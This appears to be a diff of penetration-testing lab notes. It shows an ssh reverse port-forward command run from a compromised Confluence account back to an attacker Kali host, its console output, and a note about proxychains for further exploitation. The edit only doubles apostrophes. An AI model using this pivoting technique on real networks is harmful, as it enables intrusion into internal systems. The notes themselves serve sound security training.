@@ -694,12 +694,12 @@ MULTISERVER03 - **192.168.228.64**
 ```bash
 ssh -N -R 9998 kali@192.168.45.196
 	Could not create directory '/home/confluence/.ssh'.
-	The authenticity of host '192.168.45.196 (192.168.45.196)' can't be established.
+	The authenticity of host '192.168.45.196 (192.168.45.196)' can''t be established.
 	ECDSA key fingerprint is SHA256:Z6AWTPQLtEMVjOkkRmrchK5U1cx9L6Dek+5Gx8+icic.
 	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 	yes
 	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
-	kali@192.168.45.196's password:
+	kali@192.168.45.196''s password:
 ```
 
 - Edit proxychains config file and exploit
